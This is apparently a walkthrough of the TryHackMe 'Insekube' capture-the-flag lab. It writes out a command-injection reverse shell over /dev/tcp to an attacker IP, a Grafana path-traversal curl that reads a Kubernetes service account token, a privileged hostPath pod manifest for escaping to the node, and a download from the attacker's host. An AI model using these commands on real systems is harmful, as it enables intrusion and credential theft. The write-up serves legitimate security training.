<a href="https://tryhackme.com/room/insekube"> Insekube </a>
Exploiting Kubernetes by leveraging a Grafana LFI vulnerability

Task 1

nmap -p- -Pn -sC -sT -A --reason -o nmap.scan [Target IP]
This will give us answer rot the first question.

Task 2
On website we can perform a command injection attack by typing various command like ;whoami ;id ;ls
Author tells us that flag is in Envrometal variable so lets  type ;printenv
![image](https://user-images.githubusercontent.com/58551072/155545434-44c7d8b8-2811-4078-916e-8660a5ce6b6e.png)
We have to establish reverse shell with target machine in order to complete further task
There is no netcat or python avaliable on machine for us to use. 
We have to use Command injection attack again
127.0.0.1 && bash &>/dev/tcp/[Attacker IP]/[PORT] <&1

Task 3
No answer needed

Task 4
We have access to the machine. All we need to do is follow instructions. 
Flag is there, you can analyse it with online tools

Task 5
Running env you will see there is a Grafana service running in the cluster.
We need to find what version of Grafana is used and search for vulnerabilities
Still in console that is connected to the target machine
curl http://grafana:3000/login/ - Text is long but it is easy to find ;)

 

Task 6
I had trouble with running exploit but when googling around I have found solution
curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
Now we have token
To get service account name we can use option "get serviceaccount" and token that we have found
To get next two answers all we need to do is fllow instruction. Flag 3 is in same place as flag 1

Task 7
First we need to prepare .yaml file
`apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /`

 
To get file into TARGET machine lets start ftp server on our machine
then simply curl http://ATTACKER IP:PORT/file.yaml
to get last flag use find / -type f -name root.txt
   

